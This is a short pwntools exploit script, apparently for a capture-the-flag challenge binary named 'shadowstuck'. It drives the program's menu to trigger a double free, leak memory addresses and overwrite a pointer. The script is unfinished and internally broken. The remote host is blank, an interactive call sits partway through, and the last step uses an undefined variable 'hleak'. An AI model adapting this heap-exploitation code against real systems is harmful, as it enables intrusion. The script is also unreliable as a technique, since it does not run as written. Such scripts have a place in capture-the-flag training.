from pwn import *

e = ELF("./shadowstuck")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("", )
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})


def alloc(name):
  p.sendlineafter(">", "A")
  p.recvuntil("name:")
  p.sendlineafter(">", name)

def free(name, note):
  p.sendlineafter(">", "F")
  p.recvuntil("fire?")
  p.sendlineafter(">", name)
  p.recvuntil("removed.")
  p.sendlineafter(">", note)

p.recvuntil("0x")
sleak = int(p.recvline(), 16)
print(hex(sleak))

alloc("AAAA")

p.interactive()
debug()
free("AAAA", "C")
free("AAAA", "C")


p.sendlineafter(">", "R")
p.sendlineafter(">", "0")

p.recvuntil("name: ")

leak = u64(p.recvline(keepends=False).ljust(8, "\x00"))
print(hex(leak))

p.sendlineafter(">", "C")
p.sendlineafter(">", "0")
p.sendlineafter(">", p64(hleak))


p.interactive()
